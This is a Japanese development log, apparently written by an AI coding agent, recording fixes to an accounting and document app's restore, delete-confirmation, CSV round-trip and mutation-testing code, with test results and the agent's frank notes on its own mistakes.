★ **非対称の向きが逆である** —— 4 つの警告は指されるのに、「このままでは無効になる」1 件だけが画面のどこも指していない。同じパネルが自分の目的を「書いた本人が気づきにくい失敗だけを挙げます」と名乗っている当のものである。2 件目 (`s1shares`・保有株式数の合計が発行済株式の総数を超える) も同じ扱いで、**こちらは「どの行が多いのか」を他に示す物が無い**。★ **原因は描画が 2 系統に分かれたこと** —— `flagged` (指摘 → 段階の地図) を読む式は**書面が宣言した欄** (`doc.fields`) の描画の中にだけ在り、株主の行は 2026-09 に可変行へ変わって `ShareholderInputs` が別に描くようになったのに、そちらは `flagged` を**引数としても受け取っていなかった**。指摘の側の `field: 's1name'` は**実在する実行時の鍵**なので (`shareholderKey(1, 'name')`)、字面を見ても誤りに見えない —— **欠けていたのは受け取る側**である。★ **直しは印の付け方を 1 つにすること** —— `issueLevelUi.ts` に `fieldBorder(level, fallback)` を置き、宣言された欄と可変行の両方がそこを読む。`fallback` を呼ぶ側が渡すのは、**印が無いときの見た目が描画ごとに違う**ため (宣言された欄は `var(--border)`・可変行は stylesheet の既定 `var(--border-strong)`)。ここで既定を 1 つに決めると、印の無い欄の見た目が黙って変わる。★ **指摘の無い欄の答えは 1 つも変わらない** (実測: 住所・取得日・2 行目以降は既定の枠のまま・宣言された欄の橙も同じ)。★ **もう 1 つ: docblock が名指しした検査ファイルは 1 度も存在しなかった** —— `unreadableDates` は「ラベルは実物の書式から引く」と述べ「同じことを `docStudioDateFields.test.ts` が留める」と書いていたが、**`git log --all` で 0 コミット・`find` で 0 件**。名指しされた機械が無いので、その不変条件は 2026-09-09 から誰も留めていなかった (パス 425 / 426 の「指した先に物が在って初めて名指しである」を、**コードが自分の保証について述べる文**へ当てた形)。新しい検査がその主張も持つ (検収書の `payday` は書式ごとに 7 通りのラベルを持ち、ここでは「代金の支払期日」—— 写すと食い違う)。★ **機械は 2 層** —— `renderer/pages/__tests__/docIssueFieldMarked.test.ts` (**9 件**) の**母集団は走査で導く** (原文から `field: '…'` を拾う・実測 38 ルール / 30 箇所以上の床つき)。1 つずつ「書面が宣言した欄」か「理由つきの可変行の台帳」かに分け、台帳は**両方向** (宣言された欄になったのに台帳へ残れば落ちる)。**背骨は振る舞い** —— 実物の画面を描いて実際に枠の色を読む (期待値も `style.border` への代入 → 読み戻しで作るので、`LEVEL_COLOR` の書き方が変わっても照合しているのは色そのものである)。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 可変行が `flagged` を読まない ❌2 (**欠陥がそのまま再現**) / B 台帳から 1 行消す ❌1 / C 宣言された欄を台帳へ ❌1 (**逆向き**) / D ラベルを手写しへ戻す ❌1 (**パス 101 の欠陥の再現**) / E 針を殺す ❌2 (**床と逆向きの台帳**) / F 宣言された欄が印を出さない ❌1・復帰後 ❌0)。★ **測って何も無かった軸も記録する**: ① **`collectionShapesRoundTrip` は 23 / 23 collection を今日すべて覆っている** (走査で突き合わせた) —— 母集団を `COLLECTION_SHAPES` から導く機械はまだ無いので、24 個目が足された日は黙る (残作業のまま) ② **`orNull` の欄 (presence を要求する) を書く側は全部キーを出す** —— `parseReading` / `parseBatch` / `parseControlRecord` は未定でも `null` を書き、`mutualfund-holdings` の 2 欄は `opt(orNull(…))` なので不在も通る。**形が足された日 (パス 194 / 2026-09-05) より前の記録は存在しない**ので、古い控えが落ちる道も無い ③ **日付の法定判定を `day()` で行う 2 ルール (`kaiko-yokoku` / `kenshu`) は、読む鍵と `unreadableDates` に渡す鍵が完全に一致する** (走査で突き合わせた) ④ **マージ復元はこの端末の方が新しい記録を取り込まない** ので、利用者の編集を黙って失わない ⑤ **`reencryptAll` は有効化・解除のどちらでも安全** —— 読む側の cipher は平文を素通しするので、移行中に入った書き込みを取り違えない (鍵を替える `reencryptAll` は呼び手が 0 件)。★ **自戒 2 つ**: ① **対照の後片付けに `git checkout --` を使い、同じファイルに在った自分の未コミットの訂正を消した** —— 控えを取っていたのは 3 本だけで、`docStudioChecks.ts` は取っていなかった。手で書き直し、**その場で控えを取った**。**対照で触るファイルは、触る前に控える** (パス 418 の「新しいファイルは git で戻らない」の裏返しの失敗) ② **検査は 9 件とも緑なのに `typecheck` だけが 1 件捕まえた** —— `waitForElement<HTMLButtonElement>(() => container.querySelector(…))` と型引数を**外側**に付けたので `querySelector` が `Element` を返していた。vitest は型を剥がすので当たらない。**パス 373 / 402 / 404 と同じ罠で 4 度目**である。`typecheck` 緑・`npm test` **852 / 18,520**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15482 → **15491** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 262 ms / heap 10.3 MB・FULL DCL 709 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **31 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 433 後の計測: 11,949,320 B / 3,361,839 B (両方 +386 B** —— 消す直前に数え直す 1 段と、消さなかった件数を述べる文の分。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**点検パネルが「古い一覧」で消し、復元で直ったばかりの正しい記録を消していた。** **見つけ方**: パス 432 の形 (「数える側と実行する側が別の集合を見ている」) を**時間の軸**へ当てた —— `window.confirm` を出す 10 か所を読み、「述べた数はいつ数えた物か」を問うた。実測 (2026-09-23 · 直す前):

| | |
| --- | --- |
| ① 点検 | 「調べた 3 件のうち **2 件**の形式が合いません」→ ボタン「**2 件を削除**」 |
| ② 復元 | 同じ設定画面でバックアップをマージ復元 → 同じ id が `put` で置き換わり、**実際の形式不正は 0 件** |
| ③ 押す | 確認文「**形式の合わないレコード 2 件**を削除します。元に戻せません。」→ **復元したばかりの正しい 2 件が消え**、「2 件を削除しました。」と報せる |

★ **確認文が名乗る種別も件数も、押した瞬間にはどちらも偽である。** しかも消えるのは元に戻せない。パス 432 は「同じ瞬間に別の集合を数えた」形だったが、こちらは**数えた時と実行する時の間が空いている**形で、より起きやすい —— **点検パネルとバックアップパネルは同じ設定画面に並ぶ**ので、「形式の合わない記録が 2 件ある」と知った利用者が良いバックアップを先に戻すのは自然な順序である(別のタブでも同じことが起きる)。★ **入口の非対称が前提として要る** —— `store.insert` は `isSafeCollection` + `isPlainJsonObject` しか見ないので形の合わない記録を受け、`isImportableRecord` (復元の関門・パス 432) はそれを拒む。だから「形式不正の記録」が存在しうるし、復元はその id を正しい中身で上書きできる。**直し**: ① `deleteRecords` が**消す直前に数え直し**、「今も形が合わない id」だけを消して `{deleted, skipped}` を返す (数え直しは点検と**同じ `auditRecordShapes`** ——封緘済み・読めない collection の扱いも同じになる) ② 画面は**訊く前に数え直し**、確認文も削除もその一覧で行う (確認文を本当にするため。0 件なら訊かずに「形式の合わないレコードはもうありません。削除していません。」) ③ 結果の文は `deleteResultMessage` **1 つ**が組み、消さなかった分を理由つきで言う (隣の `restoreResultMessage` と同じ形・別々に書くと「少なく消えたのに理由が出ない」形が開く)。★ **正常な順序の答えは 1 つも変わらない** —— 実測で既存の 3 件は**編集せずに緑**のままで、確認文の文面も同じ (数え直した件数が同じなら 1 字も変わらない)。★ **機械は 2 層** —— `renderer/data/__tests__/recordShapeAudit.test.ts` (**+3 件**) が「点検の後に形が合うようになった id は消さない」「混ざっていれば今も合わない分だけ消す」「消さなかった分は理由つきで言う」を直接主張し、背骨は `renderer/components/__tests__/recordShapeAuditPanel.test.ts` (**+2 件**) が**実物のパネルを描いて実際に押し**、①②③ の順序をそのまま辿る。対照 **5 方向のうち 4 方向が鳴り、それぞれ狙った検査に当たる** (A `deleteRecords` を無条件へ戻す ❌2 / B 画面が古い一覧で訊く ❌2 (**欠陥がそのまま再現**) / C 消さなかった件数を言わない ❌1 / D 0 件でも訊いて消しに行く ❌1・復帰後 ❌0)。★ **E (画面が結果の文を自分で組む) は鳴らない —— それが報せである** —— 画面が訊く前に数え直すので `skipped` は**今日の到達可能な状態では常に 0** で、手で組んだ文と `deleteResultMessage` の出力が一致する。`skipped` の句は**数え直しと実行の間の窓のための床**で、そこはデータ層の 2 件が直接留めている (パス 399 の 3 区分の「等価」)。★ **自戒: 私がこのパスで tick 依存を 1 つ作った** —— `remove()` に非同期の数え直しを 1 段足した瞬間、周回数を 0 にすると**この日より前から在った検査 1 件まで落ちた** (HEAD では 0 周でも 3/3 通っていた・実測)。押した結果を待たずに `confirm` の呼び出しを主張していたためで、**法則 `wait-for-condition-not-ticks` そのもの** (パス 424 で同じ自戒を書いた当のこと)。固定 8 周の `settle()` を捨て、`mount` は「点検のボタンが出る」を・押した後は「確認が出た」か「結果の文が出た」を**条件で**待つ形にした (パス 378 と同じ「押す側は押すだけ」)。**このファイルは固定回数の待ちを 1 つも持たなくなった**ので `audit:tick-sensitivity` の母集団から外れる。`typecheck` 緑・`npm test` **851 / 18,511**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15477 → **15482** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 252 ms / heap 10.3 MB・FULL DCL 697 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **30 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 432 後の計測: 11,948,934 B / 3,361,453 B (両方 +1,070 B** —— 復元の関門を 1 つに出し、計画が「入る物」で数え直し、確認文と結果の文に取り込めない件数を足し、全部拒まれる置換を断る文を置いた分。**増分の大半は日本語の文** (断りの 1 文だけで 150 字ほど)。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**置換復元の確認が「消える記録はありません」と述べ、押すとストアが空になった。** **見つけ方**: パス 429 の形 (往復で何が失われるか) を**バックアップの往復**へ当て、`importAll` の形の検査が `window.confirm` の**後ろ**に在ることに気付いた。実測 (2026-09-23 · 直す前):

| 場面 | 確認文が述べた事 | 押した後 |
| --- | --- | --- |
| 既存 3 件 / 控え 2 件が形式不正 | 「バックアップ: **2 件**」「3 件が消え、元に戻せません」 | **ストア 0 件** |
| 既存 1 件 / **同じ id** の控えが形式不正 | 「**消える記録はありません**」 | **ストア 0 件** |
| 既存 2 件 / 控え 5 件中 2 件が形式不正 | 「バックアップ: **5 件**」 | 入ったのは **3 件** |

★ **2 行目がいちばん重い** —— 利用者は「何も失わない」という**明示の保証**を読んで OK を押し、記録は元に戻せない。しかも結果の文も「消えた **0 件**」と言い続ける。`replaceRestoreConfirmMessage` の docblock は「消える物が無いときはそう言う (「消える記録はありません」) —— 空欄ではなく明示」と、まさにその 1 文を丁寧に作っている。**明示したから偽になった** (パス 422 の「60 文字まで」と言って 31 文字で断る形の、いちばん重い現れ)。★ **届く道は手で直した JSON ではない** —— 内数 ≦ 親項目を**書き手**が断るようになったのは 2026-09-07 で、**復元**がそれを見るようになったのは 2026-09-14 (パス 224)。それより前に取った控えは、今日の復元では落ちる (形の検査そのものが 2026-09-05 なので、それ以前の控えはもっと広く落ちる)。★ **原因は部分集合** —— `planRestore` は**ファイルの全件**で id を突き合わせており、`importAll` が落とす記録まで「バックアップの中身になる」(`overwritten`) に数えていた。**数える側と実行する側が別の集合を見ていた** (法則 `one-subset-per-answer` の、器が「これから起きる事」である現れ)。**直し**: ① 関門を `store.ts` の `isImportableRecord` **1 つ**に出し (中身は 1 字も変えていない)、計画も実行もそこを読む ② 計画は**入る物だけ**で id を突き合わせ、`dropped` と `unusableLocal` (控えに同じ id が在るのに取り込めない = 置換では消えるだけ) を数える ③ 確認文と結果の文がそれを述べる ④ **全部拒まれる置換は訊く前に断る** —— 消す方は必ず成功するので OK を貰っても結果は「全部消えて何も入らない」で、**アプリは訊く前にそれを知っている** (判定は純関数で記録は手元に在る)。断りは逃げ口を名指しする (「消したいだけなら設定の『すべてのデータを削除』を」・法則 `escape-hatch-stays-open`)。★ **正しい控えの文面は 1 字も変わらない** —— 実測で `restorePlan.test.ts` の既存 4 件は**編集せずに緑**のままで、新しい句は `dropped > 0` / `unusableLocal > 0` のときだけ出る。★ **機械は 2 層** —— `renderer/data/__tests__/restorePlanMatchesImport.test.ts` (**8 件**) が**母集団を形の表から走査で導き** (23 collection × 壊し方 4 家系・実測 40 件以上が拒まれる床つき)、「計画が『入る』と数えた物がそのまま入る」を**戻り値と実際に残った id の両方**で見る。背骨は `renderer/components/__tests__/restorePlan.test.ts` に足した **2 件**で、実物の `BackupPanel` に本物の File を渡して**訊く前に断ること**と**この端末の記録が残ること**を見る。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 計画を全件で突き合わせる ❌8 (**欠陥がそのまま再現**) / B `unusableLocal` を `lost` に入れない ❌4 / C 画面から断りを外す ❌1 (**実物が 5 秒で時間切れ = 消えている**) / D 確認文から取り込めない件数を落とす ❌3 / E 関門が何でも通す ❌9 (**床も鳴る**) / F 画面が古い引数を渡す ❌1 (**既存の `importSizeGuard` が鳴る**)・復帰後 ❌0)。★ **既存の検査の標本が弱かった (主張ではなく)** —— `backup.test.ts` の `env()` は `collection: 'sales-entries'` に `data: { amount }` だけを入れており、計画が形を見るようになると「取り込めない」に数えられる。**主張 (id の突き合わせの算術) は正しい**ので、標本を形の通る販売記録に直した (パス 429 の「弱いのは主張ではなく標本」と同じ)。★ **走査の道具を共有へ出した** —— `malformedRow` / `wrongTypedRow` (パス 360) は `malformedStoreRenders.test.ts` の中に在り、検査ファイルから import すると describe が 2 度登録される。`renderer/__tests__/malformedRows.ts` へ移した (`jsdomWait.ts` / `recordStoreHarness.ts` と同じ形)。★ **測って何も無かった軸も記録する**: ① **書く側 → 形の検査の往復は既に閉じている** (`collectionShapesRoundTrip.test.ts` が 23 collection すべてを実物の書き手で通す) ② **封緘済みは形を見られないので通る** —— 共有の述語がそれを保つ (落とすと暗号化バックアップが丸ごと復元できなくなる) ③ **マージは何も消さない**ので断らない —— 結果の文が今までどおり述べる (ただし「追加 1」と言って 0 件入る形は直った・同じ根)。`typecheck` 緑・`npm test` **851 / 18,506**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15467 → **15477** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 272 ms / heap 10.3 MB・FULL DCL 714 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **29 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 431 後の計測: 11,947,864 B / 3,360,383 B (両方 −213 B** —— 支払明細書 4 種の検算が持っていた**手書きの欄の一覧 7 本**を消し、書面の宣言から引く関数 1 つに替えた分。**減るのは、消した配列 (支給 17 欄 + 控除 25 欄) が、足した 10 行の関数より大きいため。** `renderer/data/` は両ビルドが読むので LITE も同じだけ減る。**支払明細書の検算が、書面の欄を手で写していた。** **見つけ方**: パス 430 の「測って何も無かった軸」として 「4 書面とも一致していた」と記録した所へ戻り、**一致を保つ物が在るか**を測った。★ **規則は書面の側が既に持っていた** —— `DocTable.sum` の docblock は `minus` つきの合計行について 「これを手入力の欄にすると、上の 2 表が合計している支給額・控除額と**印刷した式が成り立たなくなる** (パス 53 / 81 で 2 度直した形)。**差引は常に同じ欄から導く。**」と述べており、**書面はその規則を守っていた**。破っていたのは**検算のほう**で、同じ 2 つの一覧を `docStudioChecks.ts` へ写していた ——しかも `netPayIssues` 自身の docblock が「**ここだけ別の欄を足すと、書面はマイナスを刷っているのに何も指摘されない**」とその失敗を正しく名指ししている。★ **実測 (2026-09-23 · 直す前 · 写した一覧から 1 欄ずつ落として既存の検査を回す)**:

| 書面 | 支給から 1 欄落とす | 控除から 1 欄落とす |
| --- | --- | --- |
| `kyuyo-meisai` | **黙る** (`otherPay`) | **黙る** (`otherDed`) |
| `shoyo-meisai` | **黙る** | **黙る** |
| `yakuin-hoshu-meisai` | **黙る** | **黙る** |
| `yakuin-shoyo-meisai` | (支給は 1 欄) | **黙る** |

**測れる 7 方向すべてが黙った。** ★ **最初に手で当てた 1 件だけが鳴り、私はそれを「覆われている」と読みかけた** —— `residentTax` を落としたときは既存の検査が 1 件落ちる。**偽である** —— 鳴ったのは標本がたまたまその欄を埋めていたからで、標本が 0 のままの欄を落とすと 4 書面とも黙る。**束縛ではなく偶然**だった (パス 430 の「1 件を手で当てて全体を判断しない」の隣の形)。★ **直しは写しを消すこと** —— 検算の handler は**最初から `doc: StudioDoc` を受け取っていた** (4 つの明細書の handler だけが `(v)` と書いて無視していた) ので、`netPaySumFields(doc)` が書面の `sum.keys` / `sum.minus` を引く。**新しい import も新しい規則も要らない** (`docStudioChecks` は既に `StudioDoc` を型として読んでおり、逆向きの依存は無い)。`firstPayKey` も `pay[0]` で、4 書面とも写しと同じ欄になる。**答えは 1 つも変わらない** (既存の 195 件が全部緑)。★ **機械は振る舞いで結ぶ** —— `renderer/__tests__/netPayFieldsFromSheet.test.ts` (**4 件**) が母集団を**走査で導き** (`STUDIO_TEMPLATES` のうち `minus` つきの合計行を持つ書面・実測 4)、**宣言された欄を 1 つずつ**動かす: 控除の欄はどれも**単独で**差引をマイナスにでき検算が警告する / 支給の欄はどれも**単独で**控除を覆え警告は出ない。欄を写す形へ戻しても、**写し間違えた欄が書面名つきで名指しで鳴る**。対照 **3 方向すべて鳴り、それぞれ狙った欄を名指しする** (A 控除から `otherDed` を落とす ❌1 (`kyuyo-meisai / 控除 otherDed: expected [] to have a length of 1`) —— **旧コードが黙った当の形** / B 支給から `otherPay` を落とす ❌1 (`kyuyo-meisai / 支給 otherPay`) —— **同** / C 書面から引くのをやめる ❌2・復帰後 ❌0)。★ **この紙は利用者が従業員へ渡す** —— 給与支払明細書は所得税法231条1項の交付義務で、検算の `basis` は労働基準法24条1項 (全額払い) である。`typecheck` 緑・`npm test` **850 / 18,496**・`verify:all` exit 0。`verify:arch` のユニットテスト数を 15463 → **15467** へ (**今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 281 ms / heap 10.1 MB・FULL DCL 715 ms / heap 37.1 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **28 回目**でもあり、今回も再現しなかった)。★ **自戒: 連鎖の 1 回目は FULL の成果物が無くて perf と e2e が断った** —— 私は FULL を組んでから**scratchpad へ**退避して LITE を組んだので、`emptyOutDir` が `dist/standalone.html` を消した。`perf` の断りの文自身が正しい順序 (`cp dist/standalone.html /tmp/full.html` → lite → **戻す**) を書いており、**退避はしたが戻していなかった**。門は正しく働き、破ったのは私の手順である)・**2026-09-23 パス 430 後も 11,948,077 B / 3,360,596 B で byte 単位で不変** (直したのは `scripts/verify-survivors.cjs` と `__tests__/` 2 本・`ontology/laws.ts` の散文だけ —— **オントロジーは出荷物に入らない**ので `src/` を触っても動かない: **両方を組んで md5 まで見た**。**変異検査の「生存」を当て直す道具が、作られてから 3 日間、ほぼ常に同じ答えを返していた。** **見つけ方**: `mutate` の外に在る `parameterConsistency.ts` (**矛盾した設定を断る関門**・パス 221 / 222) を測ると **37.40% · 生存 77 + Timeout 1**。パス 356 が立てた規約どおり `audit:survivors` へ通すと **78 / 78 が「実は殺されている」**。ところが**手で当てた 1 件が通った** —— `for (let i = 0; i + 1 < order.ids.length; i++)` を `<=` にして `vitest related` を回すと **102 ファイル 1,093 件すべて緑・170 秒**。同じ変異体に道具は **13 秒**で「殺されている」と答えていた。★ **原因は列の数え方** —— `applyReplacement` が Stryker の**列を 0 始まり**として扱っていた (実物は行も列も 1 始まり)。当てるたびに**前後 1 文字ずつを食う**:

| | |
| --- | --- |
| 原文 | `` out.push({ pair: `${a}=${b}`, text: … }); `` |
| 当てた | ``out.push({ pair: ``` text: … });`` ← 引用符と読点が壊れる |

**1 始まりであることは当て推量ではなく実測で決めた** —— 報告の StringLiteral **51 件**について `slice(column - 1)` は **51 件すべて**で元のリテラルを復元し、`slice(column)` は **0 件**だった。★ **なぜ 3 日も見えなかったか —— 判定が飲み込んでいた** —— 壊れたソースは vitest が transform で落とすが、`runRelated` は**非 0 終了をすべて「検査が落ちた」と読んでいた**。時間切れもメモリ不足も transform の失敗も同じ答えになるので、**当て方が壊れていることが結論の形をとって消えた**。★ **自己テストは 2 つとも同じ誤った前提で書かれていた** —— `--self-test` の `if (x > 0) {` の `x > 0` を 0 始まりの 4..9 と置いており、`verifySurvivors.test.ts` (vitest 側の双子) も同じ。**弱さを仕様として留める形** (`no-weakness-as-spec`) の、道具の側での現れである。**直し**: ① 列を 1 始まりへ ② **当てた結果が読めるかの門** (`parseError` · esbuild) —— 読めなければ判定ではなく道具の誤りとして言う ③ **判定を 3 通りに分ける** (`killed` / `survived` / **`error`**) —— vitest が「N 件が落ちた」と述べたときだけ殺された、それ以外は上へ出して exit 1 ④ 自己テストを**実物と同じ形の標本**で書き直し、**0 始まりで当てると壊れること**を対照に置く。★ **測り直した** —— 同じ 78 件の先頭 6 件で **5 件が偽 / 1 件が本物**。直す前は 6/6 が「殺されている」だったので、**答えが混ざったこと自体が、以前の一定の答えが人工物だった証拠**である。★ **そして本物の 1 件は、関門の本物の穴だった** —— 生き残ったのは `violations` の**相違**の枝の鍵 (`pair: ${a}=${b}`)。関門は「直している途中の 1 手を断らない」ために**破れている組**を数えるので、鍵が組を見分けないと **1 組でも破れていれば 2 組目を黙って通す**。**順序の枝の鍵は 2026-09-13 から検査が在り、相違の枝の双子だけが無かった** —— だから測定はこの 1 件だけを指した。検査を足し、対照 (その変異体を当てる) が**その 1 件だけ**を鳴らすことを確かめた。★ **publish 済みの数を撤回した** —— パス 356 の「35 / 35 が偽」・パス 399 の「10 件のうち 7 件が偽」・パス 353 / 355 へ遡って当てた 26 件は**どれもこの判定を通っている**。`ontology/laws.ts` の `measure-before-claim` が持っていた「**61 件のうち 58 件が偽**」も同じなので、実測へ書き直した。**「偽の生存が在る」は生きている** —— パス 356 が**手で**当てた 1 件 (`apiResponse.ts:124` → 検査 5 件が落ちる) と、今日手で当てた 1 件 (`AXIS_BAND_SUFFIX` の `$` 落とし → 検査 2 件が落ちる) は独立に確かめられている。**偽が在ることは正しく、何件が偽かは測り直しが要る。**★ **対照 2 方向とも鳴り、それぞれ狙った検査に当たる** (A 列を 0 始まりへ戻す ❌4 (**位置の 3 件 + 読めるかの 1 件**) / B 非 0 終了を全部 `killed` へ戻す ❌2 (**判定の分類の 2 件だけ**)・復帰後 ❌0)。★ **測って何も無かった軸も記録する**: ① **成長性の指標** (前期比 / CAGR / 売上トレンド) —— `groupRevenueByPeriod` が `readablePeriodRows` を通るので、期が読めない行は系列に入らない。CAGR の指数も `1/(期数 − 1)` で正しい (パス 225 / 392 / 393 が閉じた軸) ② **支払明細書 4 種の検算** —— `netPayIssues` に渡す欄の一覧は書面の `sum.keys` / `minus` の**手書きの写し**だが、**4 書面とも支給側・控除側・差引の 4 通りすべてが一致していた** (走査で突き合わせた。`netPayIssues` の docblock が「ここだけ別の欄を足すと、書面はマイナスを刷っているのに何も指摘されない」と**その失敗を正しく名指ししている**が、**両者を結ぶ機械は無い** —— 今日は食い違っていないので直さず、測った事実だけ残す)。`typecheck` 緑・`npm test` **849 / 18,492**・`verify:all` exit 0・`chain:verify` 緑 (block 257・`laws.ts` は保護対象ではない)。`verify:arch` のユニットテスト数を 15457 → **15463** へ (**今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・**2026-09-23 パス 429 後の計測: 11,948,077 B / 3,360,596 B (両方 +34 B** —— KPI の書き出しに列を 1 つ足し、取り込みがその列を読む 1 行の分。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える (docblock は最小化で落ちるので、増分は実質 `"laborCost"` の綴りと `laborCost:e.laborCost` だけ)。**書き出した CSV を読み戻すと、人件費が消えていた。** **見つけ方**: パス 428 は「行が戻ること」を測ったが、**行が変わらず戻ることは測っていなかった**。その次の問いを当てた。実測 (2026-09-23 · 直す前):

| 操作 | 人件費 | 労働分配率 | 人件費率 | 一人当たり人件費 |
| --- | ---: | ---: | ---: | ---: |
| 画面の `人件費(任意)` に 2,500,000 を入力 | 2,500,000 | 41.7% | 25% | 833,333 |
| **書き出して読み戻す** | **消える** | **null** | **null** | **null** |
| **手で `laborCost` 列を足した CSV** | **消える** | —— | —— | —— |

★ **原因は 2 つで、片方だけ直しても往復しない** —— `KPI_CSV_COLUMNS` は **7 列**なのに記録の形 (`COLLECTION_SHAPES['kpi-actuals']`) は **8 欄**を宣言しており、さらに `kpiActualsFromCsv` は `parseKpiActual` へ 7 欄しか渡していなかった。つまり**書き出しが落とし、取り込みも読み戻せない**。`parseKpiActual` の側は最初から `input.laborCost` を受け付けていたので、**取り込みが読まない列を検証器だけが待っていた**。★ **消えた先が紙である** —— 人件費は金融機関等提出用の書面の「人件費」の行 (`bankSubmission.ts:470`)・損益計算書の「（うち 人件費）」・付加価値 (= 営業利益 + 人件費 + 減価償却費) の算定に入る。往復した控えで書面を出すと、その行が空欄になる。★ **既存の検査は正しい不変条件を主張していたが、標本が見分けられなかった** —— `kpiActualsCsv.test.ts` の `expect(entries).toEqual(ROWS)` は**往復の等値そのもの**で、`ROWS` に `laborCost` が無かっただけである (法則 `no-weakness-as-spec` の隣の形: **弱いのは主張ではなく標本**)。だから直しは literal の更新ではなく**標本に欄を足すこと**にした。★ **直しは 1 列 + 1 行** —— 新しい関数も新しい規則も作らない。**答えが変わる入力を測って書いた**: ① 人件費を入れていない利用者の往復は**完全に一致**する (`''` は `parseKpiActual` が「未入力」として欄ごと持たせない) ② 7 列の古い CSV は**今までどおり読め、欄も生えない** (後方互換) ③ **人件費 > 販管費 の手書き CSV は断られるようになった** —— 直す前は黙って無視されていた。関係の台帳は 1 つ (`recordRelations.ts`) なので、取り込みも画面と同じ文面 (「人件費は販管費以下で入力してください」) で断る。★ **機械は母集団を宣言から導く** —— `renderer/data/__tests__/csvColumnCoverage.test.ts` (**11 件**) が `data/` を走査して CSV を組み立てるモジュールを拾い (実測 3 本)、種類 (`record-roundtrip` / `report-only`) つきの台帳と**両方向**に突き合わせる。`record-roundtrip` の行には**形の全欄を過不足なく覆うこと**を両向きに要求し、`report-only` (`financialCsv.ts`) には**読み戻す口が無いこと** (`parseCsvRecords` を 1 度も呼ばない) を要求する (帳票は記録の写しではないので欄の被覆を求めるほうが誤り)。背骨は**振る舞い**で、標本は**形の宣言から**組み立てる (`Object.keys(sample)` が形の欄と一致することを同じ `it` が見るので、9 つ目の欄が足された日に黙らない)。★ **自戒: 私がパス 428 で publish した docblock が偽だった** —— 「**母集団は走査で導く**」と書いておきながら、`CSV_WRITERS` は**手書きの 3 行**で `csvWriterFiles()` は**その手書きの一覧を濾すだけ**だった。4 枚目の画面が `text/csv` を組んでも 1 度も映らない。**パス 421 が `referenceFields()` について自分で捕まえたのと同じ形を、書いた本人が 1 パス後にまた踏んだ** (法則 `measure-before-claim`)。`pages/` と `components/` を実際に歩く形へ直し、**対照 H がその訂正が効いていることを示す** —— 4 枚目に `text/csv` を植えると走査の両方向だけでなく**中身の主張まで鳴る** (`HomePage.tsx が CSV_BOM を読んでいない`)。訂正前はどちらも黙っていた。対照 **9 方向すべて鳴り、それぞれ狙った検査に当たる** (A 列を 7 へ戻す ❌5 (**欠陥がそのまま再現**) / B 取り込みから外す ❌4 / C 形に無い列を台帳へ ❌2 (**逆向き・A とは別の行に当たる**) / D 台帳から 1 行消す ❌1 / E 針を殺す ❌1 (**床**) / F `report-only` に読み戻す口を足す ❌1 / G 標本から 1 欄落とす ❌1 / H 4 枚目の CSV 画面 ❌2 / I BOM の台帳から 1 行消す ❌1・復帰後 ❌0)。★ **測って何も無かった軸も記録する**: ① **売上の往復は 5 欄とも無損失** —— カンマ・引用符・改行を含むメモ、`=SUM(A1)` (数式打ち消しが掛かる)、`'` で始まるメモ、`-1000` (数値なので打ち消さない) の 4 形とも一致した ② **数式打ち消しは対称** —— `guardFormula` と `unguardFormula` は同じ述語 (`wouldGuard`) を通るので、印を付ける側と外す側が 1 つである (パス 428 で BOM に欠けていた当のもの) ③ **メモの前後の空白が落ちるのは往復の欠陥ではない** —— `parseSalesEntry` が `trim()` するのは**入口でも同じ**で、保管された記録が前後に空白を持つ道が無い ④ **`financialCsv.ts` は読み戻す口を持たない** (`parseCsvRecords` 0 件) ので帳票であり、往復の母集団ではない ⑤ **CSV を組み立てるのは木全体で 3 本だけ** (`recordsToCsv` / `toCsv` の呼び手・`pages/` にも `components/` にも無い)。`typecheck` 緑・`npm test` **849 / 18,486**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15446 → **15457** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 249 ms / heap 10.3 MB・FULL DCL 729 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **27 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 428 後の計測: 11,948,043 B / 3,360,562 B (両方 +42 B** —— CSV の印 (BOM) に名前を付け、取り込みの漏斗でそれを剥がす 1 行の分。`renderer/data/csv.ts` は両ビルドが読むので LITE も同じだけ増える。**アプリは自分が書き出した CSV を、自分で読み戻せなかった。** **見つけ方**: パス 425〜427 の形 (「アプリが述べる事と、実装がする事のずれ」) を**取り込みの入口**へ当てた。`lint:charset` の台帳に「**CSV 書き出しの BOM —— これが無いと Excel が UTF-8 を読まない**」という理由つきの行が **3 画面ぶん**在り、その 3 画面は**それぞれ生の不可視文字 (U+FEFF) を先頭に足していた**。**剥がす側を探したら、どこにも無かった。** 実測 (2026-09-23):

| 読ませる物 | 売上の取り込み | KPI の取り込み |
| --- | --- | --- |
| `salesToCsv(...)` / `kpiActualsToCsv(...)` (印なし) | 1 件 ✅ | 通る ✅ |
